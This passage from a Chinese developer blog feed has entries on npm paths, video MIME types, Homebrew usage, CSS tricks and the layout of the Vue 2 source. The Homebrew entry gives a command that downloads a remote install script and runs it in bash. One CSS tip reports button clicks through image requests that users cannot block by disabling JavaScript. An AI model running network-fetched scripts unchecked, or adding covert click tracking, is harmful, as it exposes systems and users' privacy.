    <content type="text"><![CDATA[npm作为node开发过程中的必备工具，长期使用之后，您可能会想：这些全局安装的node包都放在硬盘里面的哪个地方？配置文件.npmrc文件在哪里？node包的缓存位置在哪里？本文里就讲述npm相关的这些位置信息。 如何快捷修改.npmrc配置文件.npmrc文件，就是npm的配置文件所在位置。当然，寻找这个文件的目的，多数是为了修改.npmrc文件内容。但npm提供了方便快捷的修改方式，不知道这个文件的位置，其实也是可以修改的。命令行是： 1npm config edit .npmrc配置文件在哪里如果你还是想知道.npmrc文件的位置，可以通过下面的命令查看 1npm config ls -l 关于npm的缓存目录，存在感比较低。不过还是可以通过下面的方式，找到对应的位置。 1npm config get cache npm的全局node包在哪里就是那些通过npm install xxx -g或者cnpm install xxx -g或者yarn global add xxx安装的xxx文件，到底安装在什么地方？这个其实也挺好找的。默认情况下，可以通过下面的命令查看其基础路径。 1npm config get prefix 默认情况下， win系统的路径基础部分是：%APPDATA%/npm/ mac系统下路径基础部分是：/usr/local/ 默认的全局安装包位置： win系统下路径是：%APPDATA%/npm/node_modules/ mac系统下路径是：/usr/local/lib/node_modules/ 当然对于全局包路径的查看，还可以使用下面的命令: npm root -g 转载 https://www.jianshu.com/p/e953bd426368]]></content>
      <tags>
        <tag>node</tag>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用的视频格式mime]]></title>
    <url>%2F%E5%B8%B8%E7%94%A8%E7%9A%84%E8%A7%86%E9%A2%91%E6%A0%BC%E5%BC%8Fmime%2F</url>
    <content type="text"><![CDATA[新的需求，产生新的项目，新的项目产生新的问题。对于video视频类型格式的mimeType设置，仅此备忘。 flv格式是加入关联扩展名：.flv，内容类型：application/octet-stream f4v格式是扩展名：.f4v，内容类型：application/octet-stream mp4格式是扩展名：.mp4，内容类型：video/mp4 ogv格式是扩展名：.ogv ，内容类型：video/ogg webm格式是扩展名：.webm，内容类型：video/webm]]></content>
      <tags>
        <tag>video</tag>
        <tag>mime</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Homebrew简要]]></title>
    <url>%2FHomebrew%E7%AE%80%E8%A6%81%2F</url>
    <content type="text"><![CDATA[在 Unix 大家族里，每个家族成员都有一项让人引以为豪的技能，那就是 包管理，macOS 也不例外。如果说 Mac App Store 是一家大超市，Homebrew 就是一间精品小铺——如它名字（家酿啤酒）所代表的那样。在使用 Mac 的过程当中，会接触各种 dmg 格式的安装文件，用它们装上的应用往往不知藏身何处；也可能看到一些其他人正在使用命令行工具，往往却不知道如何下载和配置。有了 Homebrew，就能轻松安装、管理、卸载许多应用，一条指令可能就足够了。 解决的问题更好管理”看不见”的应用，我们可以在 Terminal 使用命令行来轻松安装所需要的包，例如 node： 1brew install node 命令执行完毕之后，node 被安装到了 /usr/local/Cellar 目录中。 通过 Homebrew 安装的所有包都会被放在这里。 这样做有几个好处，一个是方便集中管理，删除不再使用的软件包，省去了大量软件包散落在各处带来日后清理的头疼问题。另外可以方便更集中的权限管理。 安装1/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)&quot; 常用指令安装卸载123456brew --version 或者 brew -v 显示brew版本信息brew install &lt;formula&gt; 安装指定软件brew unistall &lt;formula 卸载指定软件brew list 显示所有的已安装的软件brew search text 搜索本地远程仓库的软件，已安装会显示绿色的勾brew search /text/ 使用正则表达式搜软件 升级软件1234567brew update 自动升级homebrew（从github下载最新版本）brew outdated 检测已经过时的软件brew upgrade 升级所有已过时的软件，即列出的以过时软件brew upgrade &lt;formula&gt;升级指定的软件brew pin &lt;formula&gt; 禁止指定软件升级brew unpin &lt;formula&gt; 解锁禁止升级brew upgrade --all 升级所有的软件包，包括未清理干净的旧版本的包 清理相关12345brew cleanup -n 列出需要清理的内容brew cleanup &lt;formula&gt; 清理指定的软件过时包brew cleanup 清理所有的过时软件brew unistall &lt;formula&gt; 卸载指定软件brew unistall &lt;fromula&gt; --force 彻底卸载指定软件，包括旧版本 管理”看得见”的应用Homebrew Cask 是 Homebrew 的扩展，借助它可以方便地在 macOS 上安装 图形界面程序，即我们常用的各类应用。Homebrew 中文含义为自制、自酿酒，Cask 中文含义为桶、木桶，桶装酒是一种成品，也就是说每一个 homebrew cask 都可以直接使用的，比如著名浏览器 Chrome 的 Cask 名称为 google-chrome，那么就可以使用如下命令安装： 1brew cask install google-chrome 自动管理依赖关系如果没有包管理工具，我们就需要找到每个组件的下载位置，还要手动管理它们的更新，依赖关系等等，这些事情就需要消耗掉不少的精力。 好在包管理工具已经为我们处理好了这一切，我们要做的只是安装和使用。例如，要下载一个依赖于另一个软件的应用，比如说you-get（一款下载互联网视频的自由软件）需要先安装Python 3。Homebrew会要么提醒你电脑缺少所依赖的Python 3，要么恰如其分地把依赖的软件不多不少地安装好，再继续中断的You-Get安装过程（通常情况下会采取后者）。整个过程不但安全可靠，而且简洁优雅，所有软件都来源于其对应的官方网站，并能够安全干净地卸载，而这一切都是普通的安装方式所做不到或做不好的。 终端代理问题由于境内网络环境的复杂性，有不少情况下我们可能无法正常地更新 brew 和其管理下的应用。而我们日常电脑上使用的一些代理软件，通常没办法自动对终端进行代理，所以需要手动进行一些相应的设置，以方便日后的使用。 之前用的是 proxychains-ng 的一款命令行应用。由于 macOS 升级后的 SIP 限制，在 proxychains.conf 文件中设置 ss 的 socks5 代理，无效了。解决办法是在重启后，在 Recovery mode 下关闭 SIP，但是这种方法现在已经不太推荐了。这里采用的是把代理服务器地址写入 shell 配置文件 .bashrc 或者 .zshrc 的方法，直接在 .bashrc 或者 .zshrc 添加下面内容： 12export http_proxy=&quot;http://localhost:port&quot;export https_proxy=&quot;http://localhost:port&quot; 如果使用的是trojan或者Shadowsocks类似的客户端用户，可以手动到应用的高级设置里边查看，如图所示则需要将配置的端口设置为 1080：如下图所示： 相应的代码如下所示： 12export http_proxy=&quot;socks5://127.0.0.1:1080&quot;export https_proxy=&quot;socks5://127.0.0.1:1080&quot; 或者直接设置 ALL_PROXY： 1export ALL_PROXY=socks5://127.0.0.1:1080 localhost 就是一个域名，域名默认指向 127.0.0.1，两者是一样的。然后ESC后:wq保存文件，接着在终端中执行 source ~/.bashrc，或者退出当前终端再起一个终端。 这个办法的好处是把代理服务器永久保存了，下次就可以直接用了。或者通过设置alias简写来简化操作，每次要用的时候输入 setproxy，不用了就 unsetproxy 补充关于替换镜像源，个人不推荐使用镜像，会存在延时或抽风的时候。同时改变完成后可能还需要还原，如果一定要使用，推荐USTC（中科大镜像）。 替换12345678910111213141516# 替换 Homebrewgit -C &quot;$(brew --repo)&quot; remote set-url origin https://mirrors.ustc.edu.cn/brew.git# 替换 Homebrew Coregit -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git# 替换 Homebrew Caskgit -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git# 替换 Homebrew-bottles# 对于 bash 用户：echo &apos;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&apos; &gt;&gt; ~/.bash_profilesource ~/.bash_profile# 对于 zsh 用户：echo &apos;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&apos; &gt;&gt; ~/.zshrcsource ~/.zshrc 重置123456789101112# 重置brew.gitcd &quot;$(brew --repo)&quot;git remote set-url origin https://github.com/Homebrew/brew.git# 重置Homebrew-core.gitcd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot;git remote set-url origin https://github.com/Homebrew/homebrew-core.git# 替换Homebrew Caskgit -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://github.com/Homebrew/homebrew-cask.git# 注释掉bash/zsh配置文件里的有关Homebrew Bottles 参考链接https://www.zhihu.com/question/31360766/answer/673451632]]></content>
      <tags>
        <tag>Homebrew</tag>
        <tag>镜像</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[好用的css技巧]]></title>
    <url>%2F%E5%A5%BD%E7%94%A8%E7%9A%84css%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[汇总开发中可使用的好用又简单的css技巧。 :active伪类与CSS数据上报12345678.button-1:active::after &#123; content: url(./pixel.gif?action=click&amp;id=button1); display: none;&#125;.button-2:active::after &#123; content: url(./pixel.gif?action=click&amp;id=button2); display: none;&#125; 如果想要知道两个按钮的点击率，CSS就可以实现，无需通过JavaScript开发,当点击按钮的时候，相关行为数据就会上报给服务器，这种上报就算把JavaScript禁用掉也无法阻止，方便快捷，特别适合A/B测试 :empty 伪类div元素为空就会匹配:empty伪类，呈现出虚线框 1&lt;div class="cs-empty"&gt;&lt;/div&gt; 12345.cs-empty:empty&#123; width: 120px; padding: 20px; border: 10px dashed;&#125; 隐藏空元素在动态列表之类，如果没有加载出来前，会因为margin之类的存在大量空白，可通过该方式隐藏 123.cs-module:empty &#123; display: none;&#125; 字段缺失智能提示12345678910&lt;dl&gt; &lt;dt&gt;姓名：&lt;/dt&gt; &lt;dd&gt;张三&lt;/dd&gt; &lt;dt&gt;性别：&lt;/dt&gt; &lt;dd&gt;&lt;/dd&gt; &lt;dt&gt;手机：&lt;/dt&gt; &lt;dd&gt;&lt;/dd&gt; &lt;dt&gt;邮箱：&lt;/dt&gt; &lt;dd&gt;&lt;/dd&gt;&lt;/dl&gt; 1234dd:empty::before &#123; content: '暂无'; color: gray;&#125; 数据为空提示搜索数据为空时之类的场景可以使用 1234567.cs-module:empty::before&#123; content: '没有搜索结果'； display: block; line-height: 300px; text-align: center; color: gray;&#125; :only-child伪类12345678910111213&lt;!-- 1. 只有加载图片 --&gt;&lt;div class="cs-loading"&gt; &lt;img src="./loading.png" class="cs-loading-img"&gt;&lt;/div&gt;&lt;!-- 2. 只有加载文字 --&gt;&lt;div class="cs-loading"&gt; &lt;p class="cs-loading-p"&gt;正在加载中...&lt;/p&gt;&lt;/div&gt;&lt;!-- 3. 加载图片和加载文字同时存在 --&gt;&lt;div class="cs-loading"&gt; &lt;img src="./loading.png" class="cs-loading-img"&gt; &lt;p class="cs-loading-p"&gt;正在加载中...&lt;/p&gt;&lt;/div&gt; 12345678910111213141516171819202122232425262728.cs-loading &#123; height: 150px; position: relative; text-align: center; /* 与截图无关，截图示意用 */ border: 1px dotted;&#125;/* 图片和文字同时存在时在中间留点间距 */.cs-loading-img &#123; width: 32px; height: 32px; margin-top: 45px; vertical-align: bottom;&#125;.cs-loading-p &#123; margin: .5em 0 0; color: gray;&#125;/* 只有图片的时候居中绝对定位 */.cs-loading-img:only-child &#123; position: absolute; left: 0; right: 0; top: 0; bottom: 0; margin: auto;&#125;/* 只有文字的时候行号近似垂直居中 */.cs-loading-p:only-child &#123; margin: 0; line-height: 150px;&#125; 三角形12345678910111213141516/** 正三角 */.triangle &#123; width: 0; height: 0; border-style: solid; border-width: 0 25px 40px 25px; border-color: transparent transparent rgb(245, 129, 127) transparent;&#125;/** 倒三角 */.triangle &#123; width: 0; height: 0; border-style: solid; border-width: 40px 25px 0 25px; border-color: rgb(245, 129, 127) transparent transparent transparent;&#125; 虚线效果具体的虚线的颜色和间距都可以通过repeating-linear-gradient生成的条纹背景去调整 1234.dotted-line&#123; border: 1px dashed transparent; background: linear-gradient(white,white) padding-box, repeating-linear-gradient(-45deg,#ccc 0, #ccc .25em,white 0,white .75em);&#125; 文本超出省略号单行省略 123456.single-ellipsis&#123; width: 500px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;&#125; 多行文本 12345678.multiline-ellipsis &#123; display: -webkit-box; word-break: break-all; -webkit-box-orient: vertical; -webkit-line-clamp: 4; //需要显示的行数 overflow: hidden; text-overflow: ellipsis;&#125; 扩展: -webkit-line-clamp 是一个 不规范的属性（unsupported WebKit property），它没有出现在 CSS 规范草案中。 时间轴 123456&lt;div class="timeline-content"&gt; &lt;div v-for='(item, index) in timeLine' :key='index' class="time-line"&gt; &lt;div :class="`state-$&#123;item.state&#125; state-icon`"&gt;&lt;/div&gt; &lt;div class="timeline-title"&gt;&#123;&#123;item.title&#125;&#125;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627282930313233343536/** 时间轴 */.timeline-content&#123; display: flex; .time-line&#123; padding: 10px 10px 10px 20px; position: relative; &amp;::before&#123; content: ''; height: 1px; width: calc(100% - 34px); background: #EBEBEB; position: absolute; left: 24px; top: 0; &#125; &#125; .state-icon&#123; width: 20px; height: 20px; position: absolute; top: -12px; left: 0; &#125; .state-1&#123; background: url('https://static.daojia.com/assets/project/tosimple-pic/fen-zu-7-copy-6bei-fen_1589266208621.png') no-repeat; background-size: cover; &#125; .state-2&#123; background: url('https://static.daojia.com/assets/project/tosimple-pic/12_1589266226040.png') no-repeat; background-size: cover; &#125; .state-3&#123; background: url('https://static.daojia.com/assets/project/tosimple-pic/fen-zu-7-copy-3_1589266140087.png') no-repeat; background-size: cover; &#125;&#125; calc()函数 用来计算css属性的值。 12/** 属性：calc（expression）*/宽度：calc（100％ - 34px）; 滚动条 123456789101112131415161718192021222324252627282930.scroll-container &#123; height: 250px; border: 1px solid #ddd; padding: 15px; overflow: auto; .row &#123; margin: 0; line-height: 1.5; &#125; &amp;::-webkit-scrollbar &#123; width: 8px; background: white; &#125; &amp;::-webkit-scrollbar-corner, /* 滚动条角落 */ &amp;::-webkit-scrollbar-thumb, &amp;::-webkit-scrollbar-track &#123; border-radius: 4px; &#125; &amp;::-webkit-scrollbar-corner, &amp;::-webkit-scrollbar-track &#123; /* 滚动条轨道 */ background-color: rgba(180, 160, 120, 0.1); box-shadow: inset 0 0 1px rgba(180, 160, 120, 0.5); &#125; &amp;::-webkit-scrollbar-thumb &#123; /* 滚动条手柄 */ background-color: #00adb5; &#125;&#125; 卡卷效果 12345678910.coupon&#123; width: 300px; height: 100px; position: relative; background: radial-gradient(circle at right bottom, transparent 10px, #ffffff 0) top right /50% 51px no-repeat, radial-gradient(circle at left bottom, transparent 10px, #ffffff 0) top left / 50% 51px no-repeat, radial-gradient(circle at right top, transparent 10px, #ffffff 0) bottom right / 50% 51px no-repeat, radial-gradient(circle at left top, transparent 10px, #ffffff 0) bottom left / 50% 51px no-repeat; filter: drop-shadow(2px 2px 2px rgba(0,0,0,.2));&#125; 阴影效果 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// 三角形阴影.shadow-triangle&#123; width: 0; height: 0; border-style: solid; border-width: 0 50px 50px 50px; border-color: transparent transparent rgb(245, 129, 127) transparent; filter:drop-shadow(10px 0px 10px rgba(238, 125, 55,0.5));&#125;// 缺圆投影.circle-square&#123; width:100px; height:50px; line-height: 50px; background: radial-gradient(circle at bottom right, transparent 20px, rgb(245, 129, 127) 15px); filter: drop-shadow(2px 2px 2px rgba(238, 132, 66, 0.9));&#125;// 气泡阴影.tip &#123; width: 100px; height: 30px; line-height: 30px; border: 1px solid rgb(245, 129, 127); border-radius: 4px; position: relative; background-color: #fff; filter: drop-shadow(0px 2px 4px rgba(245, 129, 127, 0.9)); &amp;::before &#123; content: ""; width: 0; height: 0; border-style: solid; border-width: 0 10px 10px 10px; border-color: transparent transparent #fff transparent; position: absolute; top: -10px; left: 0; right: 0; margin: auto; z-index: 2; &#125; &amp;::after &#123; content: ""; width: 0; height: 0; border-style: solid; border-width: 0 10px 10px 10px; border-color: transparent transparent rgb(245, 129, 127) transparent; position: absolute; top: -11px; left: 0; right: 0; margin: auto; z-index: 1; &#125;&#125; 页面全部置灰 特殊时期，需要网站整体置灰时使用。 123456789html &#123; -webkit-filter: grayscale(100%); -moz-filter: grayscale(100%); -ms-filter: grayscale(100%); -o-filter: grayscale(100%); filter: grayscale(100%); filter: gray; filter: progid:DXImageTransform.Microsoft.BasicImage(grayscale=1);&#125;]]></content>
      <tags>
        <tag>css</tag>
        <tag>技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue源码学习]]></title>
    <url>%2Fvue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[随着vue3.x的正式版推出，再加上长时间的使用vue，本着对本质的追求，学习总结一下源码的学习。考虑到3.x的相关环境还不是很稳定，未来一段时间，大多数时候用的应该还是2.x，先从2.x版本源码学习，相对网上参考资料也多。总结结合知识汇总下。 本篇主要关于对vue源码的简单认识，主要是前期的准备工作。 FlowFlow 是 facebook 出品的 JavaScript 静态类型检查工具。Vue.js 的源码利用了 Flow 做了静态类型检查，所以了解 Flow 有助于我们阅读源码。 类似的还有TypeScript,这里推荐下https://ts.xcatliu.com/，相对官网文档，更容易学习TS 类型检测类型检测的优点是有目共睹的，对于js其灵活性既是优点也有缺陷，过于灵活的副作用是很容易就写出非常隐蔽的隐患代码，在编译期甚至看上去都不会报错，但在运行阶段就可能出现各种奇怪的 bug。 类型检查，就是在编译期尽早发现（由类型错误引起的）bug，又不影响代码运行（不需要运行时动态检查类型），使编写 JavaScript 具有和编写 Java 等强类型语言相近的体验。 为什么用flowVue.js 在做 2.0 重构的时候，在 ES2015 的基础上，除了 ESLint 保证代码风格之外，也引入了 Flow 做静态类型检查。之所以选择 Flow，主要是因为 Babel 和 ESLint 都有对应的 Flow 插件以支持语法，可以完全沿用现有的构建配置，非常小成本的改动就可以拥有静态类型检查的能力。 备注：这里个人推荐多人协作使用ts，个人或者需要类型检测可灵活配置时使用flow。 语法这个简单写一下相关语法，熟悉ts或者后台语言，很容易理解这方面的知识。具体没提到的推荐在官网查看。 工作方式 类型推断：通过变量的使用上下文来推断出变量类型，然后根据这些推断来检查类型。 类型注释：事先注释好我们期待的类型，Flow 会基于这些注释来判断。 类型推断不需要任何代码修改即可进行类型检查，最小化开发者的工作量。它不会强制你改变开发习惯，因为它会自动推断出变量的类型。这就是所谓的类型推断，Flow 最重要的特性之一。 123456/*@flow*/ //有这个注释定义时，flow才会去识别function split(str) &#123; return str.split(' ')&#125;split(11) //报错，提示不是字符串类型 类型注释123456789101112131415161718192021222324252627282930313233/*@flow*/// 函数function add(x: number, y: number): number &#123; return x + y&#125;add('Hello', 11) // x，y都应为num，报错提示类型错误// 数组 Array&lt;T&gt;var arr: Array&lt;number&gt; = [1, 2, 3]arr.push('Hello') // 报错，arr定义了数组类型应为number// 类和对象class Bar &#123; x: string; // x 是字符串 y: string | number; // y 可以是字符串或者数字 z: boolean; constructor(x: string, y: string | number) &#123; this.x = x this.y = y this.z = false &#125;&#125;var bar: Bar = new Bar('hello', 4)var obj: &#123; a: string, b: number, c: Array&lt;string&gt;, d: Bar &#125; = &#123; a: 'hello', b: 11, c: ['hello', 'world'], d: new Bar('hello', 3)&#125;// null 若想任意类型 T 可以为 null 或者 undefined，只需类似如下写成 ?T 的格式即可var foo: ?string = null // foo可以时string也可以时null vue源码中的flow想引用第三方库，或者自定义一些类型，但 Flow 并不认识，因此检查的时候会报错。为了解决这类问题，Flow 提出了一个 libdef 的概念，可以用来识别这些第三方库或者是自定义类型，而 Vue.js 也利用了这一特性。 在 Vue.js 的主目录下有 .flowconfig 文件， 它是 Flow 的配置文件，感兴趣的同学可以看官方文档。这其中的 [libs] 部分用来描述包含指定库定义的目录，默认是名为 flow-typed 的目录。 123456789flow├── compiler.js # 编译相关├── component.js # 组件数据结构├── global-api.js # Global API 结构├── modules.js # 第三方库定义├── options.js # 选项相关├── ssr.js # 服务端渲染相关├── vnode.js # 虚拟 node 相关├── weex.js # weex框架 相关 关于weex，推荐官网https://weex.apache.org/zh/guide/introduction.html，简单来讲就是一套代码多个平台。 vue源码目录主代码在src目录下，简单结构如下。 1234567src├── compiler # 编译相关├── core # 核心代码├── platforms # 不同平台的支持├── server # 服务端渲染├── sfc # .vue 文件解析├── shared # 共享代码 compilercompiler 目录包含 Vue.js 所有编译相关的代码。它包括把模板解析成 ast 语法树，ast 语法树优化，代码生成等功能。 编译的工作可以在构建时做（借助 webpack、vue-loader 等辅助插件）；也可以在运行时做，使用包含构建功能的 Vue.js。显然，编译是一项耗性能的工作，所以更推荐前者——离线编译。 corecore 目录包含了 Vue.js 的核心代码，包括内置组件、全局 API 封装，Vue 实例化、观察者、虚拟 DOM、工具函数等等。 platformsVue.js 是一个跨平台的 MVVM 框架，它可以跑在 web 上，也可以配合 weex 跑在 native 客户端上。platform 是 Vue.js 的入口，2 个目录代表 2 个主要入口，分别打包成运行在 web 上和 weex 上的 Vue.js。 serverVue.js 2.0 支持了服务端渲染，所有服务端渲染相关的逻辑都在这个目录下。注意：这部分代码是跑在服务端的 Node.js 服务端渲染主要的工作是把组件渲染为服务器端的 HTML 字符串，将它们直接发送到浏览器，最后将静态标记”混合”为客户端上完全交互的应用程序。 sfc通常我们开发 Vue.js 都会借助 webpack 构建， 然后通过 .vue 单文件来编写组件。这个目录下的代码逻辑会把 .vue 文件内容解析成一个 JavaScript 的对象。 sharedVue.js 会定义一些工具方法，这里定义的工具方法都是会被浏览器端的 Vue.js 和服务端的 Vue.js 所共享的。 源码构建Vue.js 源码是基于 Rollup 构建的，它的构建相关配置都在 scripts 目录下。 构建脚本基于 NPM 托管的项目都会有一个 package.json 文件。总共有 3 条命令，作用都是构建 Vue.js，后面 2 条是在第一条命令的基础上，添加一些环境参数。 1234567&#123; "script": &#123; "build": "node scripts/build.js", "build:ssr": "npm run build -- web-runtime-cjs,web-server-renderer", "build:weex": "npm run build -- weex" &#125;&#125; 构建过程构建的入口 JS 文件，在 scripts/build.js 中 12345678910111213141516let builds = require('./config').getAllBuilds()// filter builds via command line argif (process.argv[2]) &#123; const filters = process.argv[2].split(',') builds = builds.filter(b =&gt; &#123; return filters.some(f =&gt; b.output.file.indexOf(f) &gt; -1 || b._name.indexOf(f) &gt; -1) &#125;)&#125; else &#123; // filter out weex builds by default builds = builds.filter(b =&gt; &#123; return b.output.file.indexOf('weex') === -1 &#125;)&#125;build(builds) 配置文件，在 scripts/config.js 中： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768const builds = &#123; // Runtime only (CommonJS). Used by bundlers e.g. Webpack &amp; Browserify 'web-runtime-cjs': &#123; entry: resolve('web/entry-runtime.js'), dest: resolve('dist/vue.runtime.common.js'), format: 'cjs', banner &#125;, // Runtime+compiler CommonJS build (CommonJS) 'web-full-cjs': &#123; entry: resolve('web/entry-runtime-with-compiler.js'), dest: resolve('dist/vue.common.js'), format: 'cjs', alias: &#123; he: './entity-decoder' &#125;, banner &#125;, // Runtime only (ES Modules). Used by bundlers that support ES Modules, // e.g. Rollup &amp; Webpack 2 'web-runtime-esm': &#123; entry: resolve('web/entry-runtime.js'), dest: resolve('dist/vue.runtime.esm.js'), format: 'es', banner &#125;, // Runtime+compiler CommonJS build (ES Modules) 'web-full-esm': &#123; entry: resolve('web/entry-runtime-with-compiler.js'), dest: resolve('dist/vue.esm.js'), format: 'es', alias: &#123; he: './entity-decoder' &#125;, banner &#125;, // runtime-only build (Browser) 'web-runtime-dev': &#123; entry: resolve('web/entry-runtime.js'), dest: resolve('dist/vue.runtime.js'), format: 'umd', env: 'development', banner &#125;, // runtime-only production build (Browser) 'web-runtime-prod': &#123; entry: resolve('web/entry-runtime.js'), dest: resolve('dist/vue.runtime.min.js'), format: 'umd', env: 'production', banner &#125;, // Runtime+compiler development build (Browser) 'web-full-dev': &#123; entry: resolve('web/entry-runtime-with-compiler.js'), dest: resolve('dist/vue.js'), format: 'umd', env: 'development', alias: &#123; he: './entity-decoder' &#125;, banner &#125;, // Runtime+compiler production build (Browser) 'web-full-prod': &#123; entry: resolve('web/entry-runtime-with-compiler.js'), dest: resolve('dist/vue.min.js'), format: 'umd', env: 'production', alias: &#123; he: './entity-decoder' &#125;, banner &#125;, // ...&#125; 其中 entry 属性表示构建的入口 JS 文件地址，dest 属性表示构建后的 JS 文件地址。format 属性表示构建的格式，cjs 表示构建出来的文件遵循 CommonJS 规范，es 表示构建出来的文件遵循 ES Module 规范。 umd 表示构建出来的文件遵循 UMD 规范。 主要使用web端，以 web-runtime-cjs 配置为例，它的 entry 是 resolve(&#39;web/entry-runtime.js&#39;) 下面是 resolve 函数的定义。 12345678910// 源码目录：scripts/config.jsconst aliases = require('./alias')const resolve = p =&gt; &#123; const base = p.split('/')[0] if (aliases[base]) &#123; return path.resolve(aliases[base], p.slice(base.length + 1) &#125; else &#123; return path.resolve(__dirname, '../', p) &#125;&#125; 首先把 resolve 函数传入的参数 p 通过 / 做了分割成数组，然后取数组第一个元素设置为 base。在我们这个例子中，参数 p 是 web/entry-runtime.js，那么 base 则为 web。base 并不是实际的路径，它的真实路径借助了别名的配置，我们来看一下别名配置的代码，在 scripts/alias 中： 12345678910111213const path = require('path')module.exports = &#123; vue: path.resolve(__dirname, '../src/platforms/web/entry-runtime-with-compiler'), compiler: path.resolve(__dirname, '../src/compiler'), core: path.resolve(__dirname, '../src/core'), shared: path.resolve(__dirname, '../src/shared'), web: path.resolve(__dirname, '../src/platforms/web'), weex: path.resolve(__dirname, '../src/platforms/weex'), server: path.resolve(__dirname, '../src/server'), entries: path.resolve(__dirname, '../src/entries'), sfc: path.resolve(__dirname, '../src/sfc')&#125; 这里 web 对应的真实的路径是 path.resolve(__dirname, &#39;../src/platforms/web&#39;)，这个路径就找到了 Vue.js 源码的 web 目录。然后 resolve 函数通过 path.resolve(aliases[base], p.slice(base.length + 1)) 找到了最终路径，它就是 Vue.js 源码 web 目录下的 entry-runtime.js。因此，web-runtime-cjs 配置对应的入口文件就找到了。 它经过 Rollup 的构建打包后，最终会在 dist 目录下生成 vue.runtime.common.js 关于Runtime Only OR Runtime + Compiler Runtime Only 通常需要借助如 webpack 的 vue-loader 工具把 .vue 文件编译成 JavaScript，因为是在编译阶段做的，所以它只包含运行时的 Vue.js 代码，因此代码体积也会更轻量。 Runtime + Compiler 没有对代码做预编译，但又使用了 Vue 的 template 属性并传入一个字符串，则需要在客户端编译模板，如下所示： 1234567891011// 需要编译器的版本new Vue(&#123; template: '&lt;div&gt;&#123;&#123; hi &#125;&#125;&lt;/div&gt;'&#125;)// 这种情况不需要new Vue(&#123; render (h) &#123; return h('div', this.hi) &#125;&#125;) 在 Vue.js 2.0 中，最终渲染都是通过 render 函数。 入口在 web 应用下，Runtime + Compiler 构建出来的 Vue.js，它的入口是 src/platforms/web/entry-runtime-with-compiler.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100/* @flow */import config from 'core/config'import &#123; warn, cached &#125; from 'core/util/index'import &#123; mark, measure &#125; from 'core/util/perf'import Vue from './runtime/index'import &#123; query &#125; from './util/index'import &#123; compileToFunctions &#125; from './compiler/index'import &#123; shouldDecodeNewlines, shouldDecodeNewlinesForHref &#125; from './util/compat'const idToTemplate = cached(id =&gt; &#123; const el = query(id) return el &amp;&amp; el.innerHTML&#125;)const mount = Vue.prototype.$mountVue.prototype.$mount = function ( el?: string | Element, hydrating?: boolean): Component &#123; el = el &amp;&amp; query(el) /* istanbul ignore if */ if (el === document.body || el === document.documentElement) &#123; process.env.NODE_ENV !== 'production' &amp;&amp; warn( `Do not mount Vue to &lt;html&gt; or &lt;body&gt; - mount to normal elements instead.` ) return this &#125; const options = this.$options // resolve template/el and convert to render function if (!options.render) &#123; let template = options.template if (template) &#123; if (typeof template === 'string') &#123; if (template.charAt(0) === '#') &#123; template = idToTemplate(template) /* istanbul ignore if */ if (process.env.NODE_ENV !== 'production' &amp;&amp; !template) &#123; warn( `Template element not found or is empty: $&#123;options.template&#125;`, this ) &#125; &#125; &#125; else if (template.nodeType) &#123; template = template.innerHTML &#125; else &#123; if (process.env.NODE_ENV !== 'production') &#123; warn('invalid template option:' + template, this) &#125; return this &#125; &#125; else if (el) &#123; template = getOuterHTML(el) &#125; if (template) &#123; /* istanbul ignore if */ if (process.env.NODE_ENV !== 'production' &amp;&amp; config.performance &amp;&amp; mark) &#123; mark('compile') &#125; const &#123; render, staticRenderFns &#125; = compileToFunctions(template, &#123; shouldDecodeNewlines, shouldDecodeNewlinesForHref, delimiters: options.delimiters, comments: options.comments &#125;, this) options.render = render options.staticRenderFns = staticRenderFns /* istanbul ignore if */ if (process.env.NODE_ENV !== 'production' &amp;&amp; config.performance &amp;&amp; mark) &#123; mark('compile end') measure(`vue $&#123;this._name&#125; compile`, 'compile', 'compile end') &#125; &#125; &#125; return mount.call(this, el, hydrating)&#125;/** * Get outerHTML of elements, taking care * of SVG elements in IE as well. */function getOuterHTML (el: Element): string &#123; if (el.outerHTML) &#123; return el.outerHTML &#125; else &#123; const container = document.createElement('div') container.appendChild(el.cloneNode(true)) return container.innerHTML &#125;&#125;Vue.compile = compileToFunctionsexport default Vue 通过import Vue from &#39;./runtime/index&#39;,它定义在 src/platforms/web/runtime/index.js 中： 123456789101112131415161718192021222324252627282930313233343536373839404142434445import Vue from 'core/index'import config from 'core/config'import &#123; extend, noop &#125; from 'shared/util'import &#123; mountComponent &#125; from 'core/instance/lifecycle'import &#123; devtools, inBrowser, isChrome &#125; from 'core/util/index'import &#123; query, mustUseProp, isReservedTag, isReservedAttr, getTagNamespace, isUnknownElement&#125; from 'web/util/index'import &#123; patch &#125; from './patch'import platformDirectives from './directives/index'import platformComponents from './components/index'// install platform specific utilsVue.config.mustUseProp = mustUsePropVue.config.isReservedTag = isReservedTagVue.config.isReservedAttr = isReservedAttrVue.config.getTagNamespace = getTagNamespaceVue.config.isUnknownElement = isUnknownElement// install platform runtime directives &amp; componentsextend(Vue.options.directives, platformDirectives)extend(Vue.options.components, platformComponents)// install platform patch functionVue.prototype.__patch__ = inBrowser ? patch : noop// public mount methodVue.prototype.$mount = function ( el?: string | Element, hydrating?: boolean): Component &#123; el = el &amp;&amp; inBrowser ? query(el) 